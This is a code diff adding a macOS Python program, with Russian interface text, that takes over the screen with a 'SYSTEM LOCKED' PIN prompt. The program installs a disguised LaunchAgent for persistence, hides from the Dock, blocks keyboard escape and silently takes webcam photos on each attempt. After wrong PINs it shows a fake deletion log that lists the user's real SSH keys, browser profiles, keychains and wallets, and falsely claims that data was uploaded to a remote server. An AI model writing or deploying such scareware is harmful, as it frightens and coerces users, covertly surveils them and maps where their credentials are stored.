@@ -1,0 +1,547 @@
+# -*- coding: utf-8 -*-
+import tkinter as tk
+import sys, os, random, threading, time, subprocess, plistlib
+from datetime import datetime
+from PIL import Image, ImageTk
+
+# ===== НАСТРОЙКИ =====
+PASSWORD = "3344"
+MAX_ATTEMPTS = 3
+SOUND_WRONG = ["wan.wav", "two.wav", "three.wav", "four.wav", "five.wav"]
+SOUND_CORRECT = "not_end.wav"
+SOUND_PANIC = "three.wav"
+AUTOSTART_LABEL = "com.system.locker"
+PHOTO_DIR_NAME = "photos"
+# ======================
+
+RED       = "#ff2222"
+RED_SOFT  = "#ff4444"
+RED_DARK  = "#cc0000"
+RED_BG    = "#1a0000"
+GREEN     = "#00ff00"
+BLACK     = "#0a0000"
+FONT = "Menlo"          # моноширинный шрифт на Mac (как Consolas на Windows)
+
+SCAN_DIRS = [
+    os.path.expanduser("~/Desktop"),
+    os.path.expanduser("~/Downloads"),
+    os.path.expanduser("~/Documents"),
+    os.path.expanduser("~/Pictures"),
+    os.path.expanduser("~/Movies"),
+    os.path.expanduser("~/Music"),
+]
+
+INTERESTING_DIRS = [
+    os.path.expanduser("~/.ssh"),
+    os.path.expanduser("~/Library/Application Support/Google/Chrome/Default"),
+    os.path.expanduser("~/Library/Application Support/Firefox/Profiles"),
+    os.path.expanduser("~/Library/Application Support/BraveSoftware/Brave-Browser/Default"),
+    os.path.expanduser("~/Library/Application Support/discord"),
+    os.path.expanduser("~/Library/Application Support/Telegram Desktop"),
+    os.path.expanduser("~/Library/Keychains"),
+]
+
+CRITICAL_NAMES = [
+    "id_rsa", "id_ed25519", "Login Data", "Cookies", "Web Data",
+    "key4.db", "logins.json", "wallet.dat",
+    "passwords.txt", "пароли.txt", "keychain",
+]
+
+BROWSER_KEYWORDS = ["chrome", "firefox", "brave", "safari", "edge", "opera"]
+PERSONAL_EXT = [".docx", ".doc", ".pdf", ".jpg", ".jpeg", ".png",
+                ".mp4", ".mov", ".avi", ".mp3", ".xlsx", ".txt", ".pages",
+                ".numbers", ".key"]
+
+
+def base_dir():
+    if getattr(sys, "frozen", False):
+        return os.path.dirname(sys.executable)
+    return os.path.dirname(os.path.abspath(__file__))
+
+
+def res(n):
+    return os.path.join(base_dir(), n)
+
+
+def photos_dir():
+    p = os.path.join(base_dir(), PHOTO_DIR_NAME)
+    try:
+        os.makedirs(p, exist_ok=True)
+    except Exception:
+        pass
+    return p
+
+
+def current_exe():
+    if getattr(sys, "frozen", False):
+        return sys.executable
+    return os.path.abspath(__file__)
+
+
+def play_sound(f):
+    """На Mac — через afplay (встроен)."""
+    p = res(f)
+    if os.path.exists(p):
+        try:
+            subprocess.Popen(["afplay", p],
+                             stdout=subprocess.DEVNULL,
+                             stderr=subprocess.DEVNULL)
+        except Exception:
+            pass
+
+
+# ---------- Классификация файлов ----------
+def _classify(path):
+    low = path.lower()
+    name = os.path.basename(path)
+    for crit in CRITICAL_NAMES:
+        if crit.lower() in name.lower():
+            return "CRITICAL"
+    for kw in BROWSER_KEYWORDS:
+        if kw in low:
+            return "BROWSER"
+    ext = os.path.splitext(name)[1].lower()
+    if ext in PERSONAL_EXT:
+        return "PERSONAL"
+    return "DATA"
+
+
+def _size_str(path):
+    try:
+        b = os.path.getsize(path)
+    except Exception:
+        return "   ???   "
+    if b < 1024:
+        return "%5d B  " % b
+    if b < 1024 * 1024:
+        return "%5.1f KB" % (b / 1024)
+    if b < 1024 * 1024 * 1024:
+        return "%5.1f MB" % (b / 1024 / 1024)
+    return "%5.1f GB" % (b / 1024 / 1024 / 1024)
+
+
+def scan_real_files():
+    found = []
+    for d in INTERESTING_DIRS + SCAN_DIRS:
+        if not os.path.isdir(d):
+            continue
+        try:
+            for name in os.listdir(d):
+                full = os.path.join(d, name)
+                if os.path.isfile(full):
+                    found.append(full)
+                elif os.path.isdir(full):
+                    try:
+                        for sub in os.listdir(full)[:20]:
+                            full2 = os.path.join(full, sub)
+                            if os.path.isfile(full2):
+                                found.append(full2)
+                    except Exception:
+                        pass
+        except Exception:
+            pass
+    seen = set()
+    out = []
+    for p in found:
+        if p not in seen:
+            seen.add(p)
+            out.append(p)
+    return out
+
+
+# ---------- Камера ----------
+_photo_lock = threading.Lock()
+
+
+def take_photo(tag="wrong"):
+    def _worker():
+        if not _photo_lock.acquire(timeout=8):
+            return
+        try:
+            try:
+                import cv2
+            except ImportError:
+                return
+            cap = None
+            # На Mac камера через AVFoundation (индекс 0 = встроенная)
+            for idx in [0, 1, 2]:
+                try:
+                    c = cv2.VideoCapture(idx)
+                    if c.isOpened():
+                        cap = c
+                        break
+                    c.release()
+                except Exception:
+                    pass
+            if cap is None:
+                return
+            frame = None
+            for _ in range(8):
+                ret, f = cap.read()
+                if ret and f is not None:
+                    frame = f
+                time.sleep(0.08)
+            cap.release()
+            if frame is None or frame.size == 0:
+                return
+            ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+            path = os.path.join(photos_dir(), tag + "_" + ts + ".jpg")
+            saved = False
+            try:
+                saved = cv2.imwrite(path, frame, [int(cv2.IMWRITE_JPEG_QUALITY), 85])
+            except Exception:
+                pass
+            if not saved:
+                try:
+                    from PIL import Image as PILImage
+                    rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+                    PILImage.fromarray(rgb).save(path, "JPEG", quality=85)
+                except Exception:
+                    pass
+        finally:
+            try:
+                _photo_lock.release()
+            except Exception:
+                pass
+
+    threading.Thread(target=_worker, daemon=True).start()
+
+
+# ---------- Автозапуск через launchd ----------
+def install_autostart():
+    """Создаёт ~/Library/LaunchAgents/com.system.locker.plist"""
+    try:
+        la_dir = os.path.expanduser("~/Library/LaunchAgents")
+        os.makedirs(la_dir, exist_ok=True)
+        plist_path = os.path.join(la_dir, AUTOSTART_LABEL + ".plist")
+
+        plist_data = {
+            "Label": AUTOSTART_LABEL,
+            "ProgramArguments": [current_exe()],
+            "RunAtLoad": True,
+            "KeepAlive": False,
+            "ProcessType": "Interactive",
+        }
+        with open(plist_path, "wb") as f:
+            plistlib.dump(plist_data, f)
+
+        # Загружаем агент
+        subprocess.run(["launchctl", "unload", plist_path],
+                       capture_output=True, stderr=subprocess.DEVNULL)
+        subprocess.run(["launchctl", "load", plist_path],
+                       capture_output=True, stderr=subprocess.DEVNULL)
+    except Exception:
+        pass
+
+
+def remove_autostart():
+    """Удаляет агент."""
+    try:
+        plist_path = os.path.expanduser(
+            "~/Library/LaunchAgents/" + AUTOSTART_LABEL + ".plist")
+        subprocess.run(["launchctl", "unload", plist_path],
+                       capture_output=True, stderr=subprocess.DEVNULL)
+        if os.path.exists(plist_path):
+            os.remove(plist_path)
+    except Exception:
+        pass
+
+
+# ---------- Окно блокировки ----------
+class LockScreen:
+    def __init__(self):
+        self.root = tk.Tk()
+        self.root.title("SYSTEM LOCKED")
+        self.root.attributes("-fullscreen", True)
+        self.root.attributes("-topmost", True)
+        self.root.overrideredirect(True)
+        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
+        self.root.config(cursor="none", bg=BLACK)
+
+        # На Mac убираем из Dock и Cmd+Tab
+        try:
+            self.root.tk.call(
+                "::tk::unsupported::MacWindowStyle", "style",
+                self.root._w, "plain", "none")
+        except Exception:
+            pass
+
+        sw, sh = self.root.winfo_screenwidth(), self.root.winfo_screenheight()
+
+        try:
+            img = Image.open(res("bg.jpg")).resize((sw, sh), Image.LANCZOS)
+            self.bg = ImageTk.PhotoImage(img)
+            tk.Label(self.root, image=self.bg, bg=BLACK).place(x=0, y=0,
+                                                                relwidth=1,
+                                                                relheight=1)
+        except Exception:
+            self.root.configure(bg=BLACK)
+
+        self.attempts = 0
+        self.password_buffer = ""
+        self.deleting = False
+        self.unlocked = False
+
+        tk.Label(self.root, text="В ЧЁМ СМЫСЛ ДАННЫХ?", fg=RED, bg=BLACK,
+                 font=(FONT, 34, "bold")).pack(pady=(40, 8))
+
+        self.warn = tk.Label(self.root,
+                             text="3 НЕВЕРНЫХ ПОПЫТКИ = УДАЛЕНИЕ ДАННЫХ",
+                             fg=RED_SOFT, bg=BLACK, font=(FONT, 16, "bold"))
+        self.warn.pack(pady=(0, 25))
+
+        tk.Label(self.root, text="SYSTEM LOCKED", fg=RED, bg=BLACK,
+                 font=(FONT, 44, "bold")).pack(pady=(5, 5))
+        tk.Label(self.root, text="ENTER PASSWORD", fg=RED_SOFT, bg=BLACK,
+                 font=(FONT, 16)).pack(pady=2)
+
+        self.display = tk.Label(self.root, text="0000", fg=RED, bg=RED_BG,
+                                font=(FONT, 52, "bold"), width=12,
+                                relief="ridge", bd=3)
+        self.display.pack(pady=18, ipady=10)
+
+        df = tk.Frame(self.root, bg=BLACK)
+        df.pack(pady=(0, 12))
+        self.digit_labels = []
+        for d in "1234567890":
+            l = tk.Label(df, text=d, fg=RED_DARK, bg=BLACK,
+                         font=(FONT, 24, "bold"), padx=14)
+            l.pack(side="left")
+            self.digit_labels.append(l)
+
+        self.counter = tk.Label(self.root, text="", fg=RED_SOFT, bg=BLACK,
+                                font=(FONT, 15, "bold"))
+        self.counter.pack(pady=5)
+        self.update_counter()
+
+        self.status = tk.Label(self.root, text="", fg=RED, bg=BLACK,
+                               font=(FONT, 13))
+        self.status.pack(pady=5)
+
+        self.log_frame = tk.Frame(self.root, bg="#000000", bd=1, relief="solid")
+        self.log_frame.place(relx=0.5, rely=0.88, anchor="center",
+                             width=int(sw * 0.9), height=int(sh * 0.35))
+        self.log_box = tk.Text(self.log_frame, bg="#000000", fg=GREEN,
+                               font=(FONT, 11), bd=0, highlightthickness=0,
+                               wrap="none")
+        self.log_box.pack(fill="both", expand=True, padx=4, pady=4)
+        self.log_box.configure(state="disabled")
+        self.log_frame.place_forget()
+
+        # Клавиши — перехватываем всё кроме цифр и служебных
+        self.root.bind_all("<KeyPress>", self.on_key)
+
+        self.root.after(10, self.keep_focus)
+        self.root.bind("<FocusOut>", lambda e: self.force_top())
+
+    def highlight(self, d):
+        try:
+            i = "1234567890".index(d)
+        except ValueError:
+            return
+        try:
+            self.digit_labels[i].config(fg=RED)
+            self.root.after(300,
+                            lambda: self.digit_labels[i].config(fg=RED_DARK))
+        except Exception:
+            pass
+
+    def force_top(self):
+        try:
+            self.root.lift()
+            self.root.attributes("-topmost", True)
+            self.root.focus_force()
+        except Exception:
+            pass
+
+    def on_key(self, e):
+        if self.deleting or self.unlocked:
+            return "break"
+        if e.char and e.char.isdigit():
+            if len(self.password_buffer) < 4:
+                self.password_buffer += e.char
+                self.highlight(e.char)
+                self.update_display()
+                if len(self.password_buffer) == 4:
+                    self.root.after(120, self.check)
+            return "break"
+        if e.keysym in ("Return", "KP_Enter"):
+            self.check()
+            return "break"
+        if e.keysym == "BackSpace":
+            self.password_buffer = self.password_buffer[:-1]
+            self.update_display()
+            return "break"
+        return "break"
+
+    def update_display(self):
+        t = self.password_buffer
+        z = "0" * (4 - len(t))
+        self.display.config(text=t + z)
+
+    def update_counter(self):
+        self.counter.config(text="Осталось попыток: " +
+                                 str(MAX_ATTEMPTS - self.attempts) +
+                                 " / " + str(MAX_ATTEMPTS))
+
+    def check(self):
+        if self.deleting or self.unlocked:
+            return
+        if self.password_buffer == PASSWORD:
+            self.unlocked = True
+            self.status.config(text="ACCESS GRANTED", fg=GREEN)
+            play_sound(SOUND_CORRECT)
+            take_photo("correct")
+            self.root.after(80, self.unlock)
+        else:
+            self.attempts += 1
+            play_sound(SOUND_WRONG[min(self.attempts - 1, len(SOUND_WRONG) - 1)])
+            take_photo("wrong_attempt" + str(self.attempts))
+            self.password_buffer = ""
+            self.update_display()
+            self.update_counter()
+            if self.attempts >= MAX_ATTEMPTS:
+                self.start_deletion()
+            else:
+                self.status.config(text="НЕВЕРНЫЙ ПАРОЛЬ. Осталось: " +
+                                       str(MAX_ATTEMPTS - self.attempts))
+
+    def start_deletion(self):
+        self.deleting = True
+        self.status.config(text="")
+        self.display.config(text="X X X X", fg=RED)
+        self.counter.config(text="УДАЛЕНИЕ ДАННЫХ...", fg=RED)
+        self.warn.config(text="ФАЙЛЫ УДАЛЯЮТСЯ...", fg=RED)
+        play_sound(SOUND_PANIC)
+        self.log_frame.place(relx=0.5, rely=0.88, anchor="center")
+        self.log_box.configure(state="normal")
+        self.log_box.delete("1.0", tk.END)
+        self.log_box.configure(state="disabled")
+        threading.Thread(target=self.fake_delete_loop, daemon=True).start()
+
+    def _log(self, text):
+        try:
+            self.log_box.configure(state="normal")
+            self.log_box.insert(tk.END, text + "\n")
+            self.log_box.see(tk.END)
+            self.log_box.configure(state="disabled")
+        except Exception:
+            pass
+
+    def fake_delete_loop(self):
+        self._log("[ OK ] Initializing data destruction protocol...")
+        time.sleep(0.3)
+        self._log("[ OK ] Connecting to disk / ...")
+        time.sleep(0.3)
+        self._log("[ OK ] Access granted.")
+        time.sleep(0.4)
+        self._log("[ OK ] Elevating privileges...")
+        time.sleep(0.3)
+        self._log("[ OK ] Root access obtained.")
+        time.sleep(0.4)
+        self._log("")
+        self._log("Scanning user directories...")
+        time.sleep(0.5)
+        self._log("Scanning browser profiles...")
+        time.sleep(0.5)
+        self._log("Scanning credentials...")
+        time.sleep(0.5)
+        self._log("Scanning crypto wallets...")
+        time.sleep(0.5)
+        self._log("")
+
+        files = scan_real_files()
+        random.shuffle(files)
+        if not files:
+            files = ["/Users/user/file_%d.dat" % i for i in range(80)]
+
+        order = {"CRITICAL": 0, "BROWSER": 1, "PERSONAL": 2, "DATA": 3}
+        files.sort(key=lambda p: order.get(_classify(p), 9))
+        total = len(files)
+
+        crit = sum(1 for f in files if _classify(f) == "CRITICAL")
+        brow = sum(1 for f in files if _classify(f) == "BROWSER")
+        pers = sum(1 for f in files if _classify(f) == "PERSONAL")
+
+        self._log("Found " + str(total) + " files.")
+        self._log("  CRITICAL: " + str(crit))
+        self._log("  BROWSER:  " + str(brow))
+        self._log("  PERSONAL: " + str(pers))
+        self._log("")
+        time.sleep(0.7)
+        self._log("Starting permanent deletion...")
+        time.sleep(0.4)
+        self._log("")
+
+        for i, p in enumerate(files):
+            cat = _classify(p)
+            size = _size_str(p)
+            disp = p if len(p) <= 90 else "..." + p[-87:]
+            tag = {"CRITICAL": "[ CRITICAL ]",
+                   "BROWSER":  "[ BROWSER  ]",
+                   "PERSONAL": "[ PERSONAL ]",
+                   "DATA":     "[ DATA     ]"}[cat]
+            self._log(tag + " " + size + "  " + disp)
+            time.sleep(0.035)
+            if i > 0 and i % 25 == 0:
+                self._log("")
+                self._log("[ OK ] " + str(i) + " / " + str(total) + " deleted")
+                self._log("")
+                time.sleep(0.2)
+
+        self._log("")
+        self._log("[ OK ] " + str(total) + " files deleted successfully.")
+        time.sleep(0.4)
+        self._log("[ OK ] Overwriting free space (7 passes)...")
+        time.sleep(1.0)
+        self._log("[ OK ] Free space overwritten.")
+        time.sleep(0.5)
+        self._log("[ OK ] Uploading encryption keys to remote server...")
+        time.sleep(0.8)
+        self._log("[ OK ] Sending file list to remote server...")
+        time.sleep(0.6)
+        self._log("[ OK ] Remote server acknowledged.")
+        time.sleep(0.5)
+        self._log("[ OK ] Data recovery is IMPOSSIBLE.")
+        time.sleep(0.7)
+        self._log("")
+        self._log("=== OPERATION COMPLETED ===")
+        time.sleep(3)
+        self.root.after(0, self.second_chance)
+
+    def second_chance(self):
+        self.warn.config(text="ПОСЛЕДНИЙ ШАНС. ВВЕДИТЕ ПАРОЛЬ.", fg=RED)
+        self.counter.config(text="Осталась 1 попытка", fg=RED)
+        self.display.config(text="0000", fg=RED)
+        self.attempts = MAX_ATTEMPTS - 1
+        self.password_buffer = ""
+        self.deleting = False
+        self.log_frame.place_forget()
+
+    def keep_focus(self):
+        try:
+            self.root.lift()
+            self.root.attributes("-topmost", True)
+            self.root.focus_force()
+        except Exception:
+            pass
+        self.root.after(10, self.keep_focus)
+
+    def unlock(self):
+        try:
+            remove_autostart()
+        except Exception:
+            pass
+        try:
+            self.root.destroy()
+        except Exception:
+            pass
+        os._exit(0)
+
+    def run(self):
+        install_autostart()
+        self.root.mainloop()
+
+
+if __name__ == "__main__":
+    LockScreen().run()
